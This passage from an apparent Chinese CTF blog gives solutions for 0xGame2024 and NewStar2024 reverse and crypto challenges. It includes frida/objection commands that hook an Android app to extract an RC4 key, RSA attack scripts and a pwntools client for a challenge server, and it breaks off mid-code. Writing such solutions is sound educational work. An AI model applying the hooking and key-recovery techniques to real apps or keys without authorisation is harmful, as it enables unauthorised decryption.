src="/2024/10/23/0xGame2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1730027348807-e8ed697f-87c2-40e5-9dc2-6a1cf1030214.png" class="" title="img"><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0xGame</span>&#123;<span class="hljs-number">1</span>b4e549d12ccb4bb4936f95fedecebf55494dec8&#125;<br></code></pre></td></tr></table></figure><h3 id="JustSoso"><a href="#JustSoso" class="headerlink" title="JustSoso"></a>JustSoso</h3><p>getKey在native层</p><img src="/2024/10/23/0xGame2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1730079449599-604a4f2f-930b-4fd9-ad2a-31b663c75bfc.png" class="" title="img"><p>直接在资源段搜索密文</p><img src="/2024/10/23/0xGame2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1730079639545-5cff6428-debb-48c9-80d6-9d1786f2710b.png" class="" title="img"><p>得到key后rc4，有一处魔改</p><img src="/2024/10/23/0xGame2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1730079511930-564ba5b8-b6a9-4942-a927-ae6dd103da80.png" class="" title="img"><p>之后再base64</p><p>getKey的部分静态有点复杂</p><img src="/2024/10/23/0xGame2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1730079666052-67d6a2f0-60e1-4af9-bf6c-e2e734fba99f.png" class="" title="img"><p>直接尝试用objection注入得到rc4的key，android hooking watch class_method com.ctf.justsoso.MainActivity.getKey –dump-return</p><img src="/2024/10/23/0xGame2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1730079430409-422a7bb9-a018-4c2d-b147-f3c46fc9d987.png" class="" title="img"><p>用frida也行，frida -U -l 1.js -f com.ctf.justsoso</p><img src="/2024/10/23/0xGame2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1730082161906-484dc468-5717-4f65-93bd-29be17d613ab.png" class="" title="img"><p>最后解密即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4</span>(<span class="hljs-params">data, key</span>):<br>    S = [<span class="hljs-number">0</span>]*<span class="hljs-number">256</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        S[i]=<span class="hljs-number">256</span>-i<br>    j = <span class="hljs-number">0</span><br>    out = []<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + S[i] + key[i % <span class="hljs-built_in">len</span>(key)]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br><br>    i = j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> data:<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + S[i]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br>        out.append(char ^ S[(S[i] + S[j]) % <span class="hljs-number">256</span>])<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(out)<br><br>s=<span class="hljs-string">&#x27;nB9RCjwReif5P1H1MYO6m/hucCGjI6EE9wWEx/E4N+bO5k5ior6MnqAGQfc=&#x27;</span><br>out=base64.b64decode(s)<br><br><br>data = <span class="hljs-built_in">bytes</span>([<span class="hljs-number">0x9c</span>, <span class="hljs-number">0x1f</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x0a</span>, <span class="hljs-number">0x3c</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0x3f</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0xf5</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0xba</span>, <span class="hljs-number">0x9b</span>, <span class="hljs-number">0xf8</span>, <span class="hljs-number">0x6e</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0xa1</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0xc7</span>, <span class="hljs-number">0xf1</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0xe6</span>, <span class="hljs-number">0xce</span>, <span class="hljs-number">0xe6</span>, <span class="hljs-number">0x4e</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0xa2</span>, <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x8c</span>, <span class="hljs-number">0x9e</span>, <span class="hljs-number">0xa0</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0xf7</span>])<br>key = <span class="hljs-built_in">bytes</span>([<span class="hljs-number">171</span>,<span class="hljs-number">149</span>,<span class="hljs-number">153</span>,<span class="hljs-number">151</span>,<span class="hljs-number">193</span>,<span class="hljs-number">31</span>,<span class="hljs-number">143</span>,<span class="hljs-number">241</span>,<span class="hljs-number">189</span>,<span class="hljs-number">165</span>,<span class="hljs-number">181</span>,<span class="hljs-number">193</span>,<span class="hljs-number">153</span>,<span class="hljs-number">161</span>])<br><br>decrypted = rc4(out, key)<br><span class="hljs-built_in">print</span>(decrypted)<br><span class="hljs-comment">#0xGame&#123;fd51ce4b-4556-4cf9-9430-67480614e43b&#125;</span><br></code></pre></td></tr></table></figure><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h2><h3 id="crt-1"><a href="#crt-1" class="headerlink" title="crt-1"></a>crt-1</h3><p>e和phi不互素，先求出e&#x2F;&#x2F;2对应的m，再开根号，答案就是其中一个</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python">n,e = (<span class="hljs-number">1022053332886345327</span>, <span class="hljs-number">294200073186305890</span>)<br>c = <span class="hljs-number">107033510346108389</span><br> <br>phi = <span class="hljs-number">970868178</span> * <span class="hljs-number">1052721012</span><br><span class="hljs-comment">#print(gcd(e,phi))</span><br>d = invese_mod(e//<span class="hljs-number">2</span>, phi)<br>m2 = <span class="hljs-built_in">pow</span>(c,d,n)<br> <br>P.&lt;x&gt; = PolynomialRing(Zmod(n))<br>f = x^<span class="hljs-number">2</span> - m2<br>res = f.roots(multiplicities=<span class="hljs-literal">False</span>)<br> <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> res:<br>    MD5(<span class="hljs-built_in">int</span>(i))<br><br><span class="hljs-string">&#x27;127016d0be858ef48a99723710ad4d49&#x27;</span><br><span class="hljs-string">&#x27;f4107420d94cc7037114376d8566d4ef&#x27;</span><br><span class="hljs-string">&#x27;3932f6728585abbf751a212f69276d3e&#x27;</span><br><span class="hljs-string">&#x27;15820afdb9a129e89e40e57f40ff8de9&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="week2-1"><a href="#week2-1" class="headerlink" title="week2"></a>week2</h2><h3 id="rc4"><a href="#rc4" class="headerlink" title="rc4"></a>rc4</h3><p>前半部分求得四个字符，后半部分注意先fromhex</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> choice<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256<br><span class="hljs-keyword">from</span> string <span class="hljs-keyword">import</span> ascii_letters, digits<br><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>):<br>    s4 = <span class="hljs-string">&#x27;&#x27;</span>.join([choice(ascii_letters+digits) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>)])<br>    <span class="hljs-comment">#print(s4)</span><br>    s20=s4+<span class="hljs-string">&#x27;5mcbb8TCD9muMJy0&#x27;</span><br>    s=sha256(s20.encode()).hexdigest()<br>    <span class="hljs-keyword">if</span> s==<span class="hljs-string">&#x27;08d287b38cb45c90dd1a8ab20484d8122119e2e50e50b60300ee30b74a86f456&#x27;</span>:<br>        <span class="hljs-built_in">print</span>(s4)<br>        <span class="hljs-keyword">break</span><br><br>a=<span class="hljs-string">&#x27;edd186458e9679384d4623dcc37845c803f5e70cf8c60fbe5a339de88bbf93540b8ba4e407d97cadaf2fa4499d88dea4a87471&#x27;</span><br>a=<span class="hljs-built_in">bytes</span>.fromhex(a)<br>b=<span class="hljs-string">&#x27;01234567890abcdef&#x27;</span>*<span class="hljs-number">6</span><br>b=<span class="hljs-built_in">bytes</span>.fromhex(b)<br><span class="hljs-built_in">print</span>(b)<br>m=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(b)):<br>   m.append(a[i]^b[i])<br><span class="hljs-built_in">print</span>(m)<br><br>m=[<span class="hljs-number">236</span>, <span class="hljs-number">242</span>, <span class="hljs-number">195</span>, <span class="hljs-number">34</span>, <span class="hljs-number">7</span>, <span class="hljs-number">156</span>, <span class="hljs-number">197</span>, <span class="hljs-number">230</span>, <span class="hljs-number">189</span>, <span class="hljs-number">84</span>, <span class="hljs-number">23</span>, <span class="hljs-number">138</span>, <span class="hljs-number">187</span>, <span class="hljs-number">232</span>, <span class="hljs-number">238</span>, <span class="hljs-number">5</span>, <span class="hljs-number">236</span>, <span class="hljs-number">244</span>, <span class="hljs-number">196</span>, <span class="hljs-number">73</span>, <span class="hljs-number">159</span>, <span class="hljs-number">79</span>, <span class="hljs-number">5</span>, <span class="hljs-number">2</span>, <span class="hljs-number">132</span>, <span class="hljs-number">195</span>, <span class="hljs-number">143</span>, <span class="hljs-number">220</span>, <span class="hljs-number">221</span>, <span class="hljs-number">199</span>, <span class="hljs-number">3</span>, <span class="hljs-number">255</span>, <span class="hljs-number">198</span>, <span class="hljs-number">100</span>, <span class="hljs-number">165</span>, <span class="hljs-number">199</span>, <span class="hljs-number">66</span>, <span class="hljs-number">190</span>, <span class="hljs-number">245</span>, <span class="hljs-number">167</span>, <span class="hljs-number">19</span>, <span class="hljs-number">241</span>, <span class="hljs-number">84</span>, <span class="hljs-number">91</span>, <span class="hljs-number">169</span>, <span class="hljs-number">222</span>, <span class="hljs-number">166</span>, <span class="hljs-number">52</span>, <span class="hljs-number">3</span>, <span class="hljs-number">185</span>, <span class="hljs-number">158</span>]<br><br>enc=<span class="hljs-string">&#x27;dc8a84436af9bede8c622fb888dbd928dac3f778b2763461b3eeebecebf72ecca302c6a324dbc4c572c43226&#x27;</span><br>enc=<span class="hljs-built_in">bytes</span>.fromhex(enc)<br>flag=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(enc)):<br>    flag+=<span class="hljs-built_in">chr</span>(enc[i]^m[i%<span class="hljs-built_in">len</span>(m)])<br><span class="hljs-built_in">print</span>(flag)<br><span class="hljs-comment">#0xGame&#123;81682337-6731-91c7-d060-3efcdfe1ba5f&#125;</span><br></code></pre></td></tr></table></figure><h3 id="RSAIV"><a href="#RSAIV" class="headerlink" title="RSAIV"></a>RSAIV</h3><p>因为交互的总时间足够长，challenge2适合yafu手动解后输入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> math <span class="hljs-keyword">import</span> isqrt<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> choice<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256<br><span class="hljs-keyword">from</span> string <span class="hljs-keyword">import</span> ascii_letters, digits<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> gmpy2, gcdext<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io= remote(<span class="hljs-string">&#x27;118.195.138.159&#x27;</span>,<span class="hljs-number">10003</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">a</span>) : io.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">a, b</span>) : io.sendafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">a</span>) : io.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">a, b</span>) : io.sendlineafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>() : <span class="hljs-keyword">return</span> io.recv()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pr</span>() : <span class="hljs-built_in">print</span>(io.recv())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ru</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> io.recvuntil(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inter</span>() : io.interactive()<br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ch0</span>(<span class="hljs-params">s</span>):<br>    n,e,c=<span class="hljs-built_in">eval</span>(s)<br>    <span class="hljs-comment"># n=1748540272127031261953491227523826413186688228587730569034148979069843516521168331238821457</span><br>    <span class="hljs-comment"># e=3</span><br>    <span class="hljs-comment"># c=73664223980107312196785660420184405948303349111082519137365225806576685634069671168357</span><br>    k = <span class="hljs-number">0</span><br>    t = gmpy2.iroot(c,e)<br>    <span class="hljs-keyword">if</span> t[<span class="hljs-number">1</span>]:<br>        <span class="hljs-comment">#print(t[0])</span><br>        sl(<span class="hljs-built_in">str</span>(t[<span class="hljs-number">0</span>]).encode())<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>            m = gmpy2.iroot(k*n+c,e)<br>            <span class="hljs-keyword">if</span> m[<span class="hljs-number">1</span>]:<br>                <span class="hljs-comment">#print(bytes_to_long(m[0]))</span><br>                sl(<span class="hljs-built_in">str</span>(bytes_to_long(m[<span class="hljs-number">0</span>])).encode())<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">else</span>:<br>                k += <span class="hljs-number">1</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ch1</span>(<span class="hljs-params">s</span>):<br>    n,e,c,dp=<span class="hljs-built_in">eval</span>(s)<br>    <span class="hljs-comment"># n=174434352212179643958855935833036063001</span><br>    <span class="hljs-comment"># e=0x10001</span><br>    <span class="hljs-comment"># c=39466599612748960141905412873983556787</span><br>    <span class="hljs-comment"># dp=6171497056913161467</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,e):<br>        t = (dp * e - <span class="hljs-number">1</span>) % i        <span class="hljs-comment">#这是p-1前面的系数</span><br>        <span class="hljs-keyword">if</span> t == <span class="hljs-number">0</span>:<br>            p = (dp * e - <span class="hljs-number">1</span>) // i + <span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> n % p == <span class="hljs-number">0</span>:<br>                q = n // p<br>                d = gmpy2.invert(e,(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br>                <span class="hljs-comment">#print(str(pow(c,d,n)).encode())</span><br>                sl(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">pow</span>(c,d,n)).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ch2</span>(<span class="hljs-params">s</span>):<br>    n,e,c=<span class="hljs-built_in">eval</span>(s)<br>    <span class="hljs-comment"># n=319642561199483600677262826186024249019</span><br>    <span class="hljs-comment"># e=170254189003332402684383900760365999599</span><br>    <span class="hljs-comment"># c=315096655202591609017165088376826841837</span><br>    <span class="hljs-comment"># p,q=fermat(n)</span><br>    <span class="hljs-comment"># phi=(p-1)*(q-1)</span><br>    <span class="hljs-comment"># d=inverse(e,phi)</span><br>    <span class="hljs-comment"># m=pow(c,d,n)</span><br>    <span class="hljs-comment"># print(m)</span><br>    <span class="hljs-comment"># sl(str(m).encode())</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ch3</span>(<span class="hljs-params">s</span>):<br>    n,e1,c1,e2,c2=<span class="hljs-built_in">eval</span>(s)<br>    <span class="hljs-comment"># n = 123859953327496855816310504481883257257</span><br>    <span class="hljs-comment"># c1 = 115331678509320635403714895034425874310</span><br>    <span class="hljs-comment"># c2 = 19516419686488748417408440624144239780</span><br>    <span class="hljs-comment"># e1 = 162726227029902673640708475886431248549</span><br>    <span class="hljs-comment"># e2 = 92095361035743610350805143550253960191</span><br>    _ ,s1 ,s2 = gcdext(e1,e2)<br>    m = <span class="hljs-built_in">pow</span>(c1,s1,n) * <span class="hljs-built_in">pow</span>(c2,s2,n) % n<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(m).encode())<br>    sl(<span class="hljs-built_in">str</span>(m).encode())<br><br>s=ru(<span class="hljs-string">&#x27;sha256(XXXX+&#x27;</span>)<br><span class="hljs-built_in">print</span>(s)<br>s1=io.recvuntil(<span class="hljs-string">b&#x27;) == &#x27;</span>,drop=<span class="hljs-literal">True</span>)<br><span class="hljs-built_in">print</span>(s1)<br>s2=io.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>,drop=<span class="hljs-literal">True</span>)<br><span class="hljs-built_in">print</span>(s2)<br><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>):<br>    s4 = <span class="hljs-string">&#x27;&#x27;</span>.join([choice(ascii_letters+digits) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>)])<br>    <span class="hljs-comment">#print(s4)</span><br>    s20=s4+s1.decode()<br>    s=sha256(s20.encode()).hexdigest()<br>    <span class="hljs-comment">#print(type(s))</span><br>    <span class="hljs-keyword">if</span> s==s2.decode():<br>        <span class="hljs-built_in">print</span>(s4)<br>        sl(s4.encode())<br>        <span class="hljs-keyword">break</span><br><br>sla(<span class="hljs-string">&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>s=ru(<span class="hljs-string">&#x27;)&#x27;</span>)<br>ch0(s)<br>sla(<span class="hljs-string">&#x27;input choice:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;&gt;&#x27;</span>,drop=<span class="hljs-literal">True</span>)<br>s=ru(<span class="hljs-string">&#x27;)&#x27;</span>)<br>ch1(s)<br><span class="hljs-comment"># sla(&#x27;input choice:&#x27;,b&#x27;2&#x27;)</span><br><span class="hljs-comment"># io.recvuntil(&#x27;&gt;&#x27;,drop=True)</span><br><span class="hljs-comment"># s=ru(&#x27;)&#x27;)</span><br><span class="hljs-comment"># ch2(s)</span><br>sla(<span class="hljs-string">&#x27;input choice:&#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;&gt;&#x27;</span>,drop=<span class="hljs-literal">True</span>)<br>s=ru(<span class="hljs-string">&#x27;)&#x27;</span>)<br>ch3(s)<br>inter()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>比赛wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>伪随机数</tag>
      
      <tag>z3</tag>
      
      <tag>tea魔改</tag>
      
      <tag>pydas</tag>
      
      <tag>unity逆向</tag>
      
      <tag>rc4魔改</tag>
      
      <tag>中国剩余定理</tag>
      
      <tag>p高位泄露</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NewStar2024部分Reverse与Crypto</title>
    <link href="/2024/10/23/NewStar2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/"/>
    <url>/2024/10/23/NewStar2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/</url>
    
    <content type="html"><![CDATA[<h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h2><h3 id="ptrace"><a href="#ptrace" class="headerlink" title="ptrace"></a>ptrace</h3><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">fork` 函数会返回两次：一次在父进程中返回子进程的 `pid`，一次在子进程中返回 `0<br></code></pre></td></tr></table></figure><p>如果 v11 &gt; 0，表示这是父进程，如果 v11 &#x3D;&#x3D; 0，表示这是子进程,如果 v11 &lt; 0，表示 fork 失败</p><img src="/2024/10/23/NewStar2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1728473115276-9b86aa2f-c771-42d9-ba80-94f3c11dd647-17300804958261.png" class="" title="img"><p>可以不看father，直接加参数调试</p><img src="/2024/10/23/NewStar2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1728476950611-fdaa4dcc-75ae-4e9b-811a-3a6e36f8ddca-17300804958273.png" class="" title="img"><p>个人觉得题目出错了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">a=[<span class="hljs-number">0xCC</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0xED</span>,<br>  <span class="hljs-number">0xAE</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0xAC</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x6D</span>,<br>  <span class="hljs-number">0xCD</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0xAC</span>,<br>  <span class="hljs-number">0xE7</span>, <span class="hljs-number">0xAF</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>    a[i]=((a[i]&gt;&gt;<span class="hljs-number">5</span>)|(a[i]&lt;&lt;<span class="hljs-number">3</span>)%<span class="hljs-number">256</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(a[i]),end=<span class="hljs-string">&quot;&quot;</span>)<br>    <br><span class="hljs-comment">#flag&#123;Do_you_really_know_ptrace?&#125;</span><br></code></pre></td></tr></table></figure><h2 id="week3"><a href="#week3" class="headerlink" title="week3"></a>week3</h2><h3 id="simpleAndroid"><a href="#simpleAndroid" class="headerlink" title="simpleAndroid"></a>simpleAndroid</h3><p>native层实现逻辑，动态注册，看JNI_Onload函数</p><img src="/2024/10/23/NewStar2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1728872332857-5d6a1390-a722-496c-8274-8f18873facb4-17300804958275.png" class="" title="img"><p>看CheckActivity类，发现CheckData</p><img src="/2024/10/23/NewStar2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1728872220912-dc5229ef-3aa6-4313-9e05-7ebdff944ccd-17300804958277.png" class="" title="img"><p>加载UseLess，并重新设置 CHAR_DATA ，后续调用base64</p><img src="/2024/10/23/NewStar2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1728872318849-2535458a-855e-40d1-b254-8e9594d61bc1-17300804958279.png" class="" title="img"><p>后续首尾调换再高低位互换</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">a=[<span class="hljs-number">0xB2</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0xF4</span>,<br>  <span class="hljs-number">0x43</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x95</span>, <span 